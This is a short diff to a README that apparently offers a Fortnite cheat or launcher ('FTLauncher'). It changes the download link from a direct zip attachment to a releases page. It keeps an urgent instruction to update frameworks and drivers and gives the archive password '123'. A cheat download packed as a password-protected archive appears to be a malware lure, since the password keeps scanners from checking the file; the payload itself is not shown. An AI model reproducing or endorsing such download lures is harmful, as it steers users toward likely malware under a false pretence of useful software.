@@ -5,7 +5,7 @@
 # ❗ ❗ ❗ WAIT ❗ ❗ ❗
 You need install or update your (Microsoft Framework and your all drivers)
 
-# [![DOWNLOAD]([https://github.com/FTlauncher1/fortnite-soft/releases/tag/Download](https://github.com/user-attachments/files/17990224/FTLauncher_v1.8.6.zip))
+# [Download x64](https://github.com/FTlauncher1/fortnite-soft/releases/tag/Download)
 *Password 123
 
 
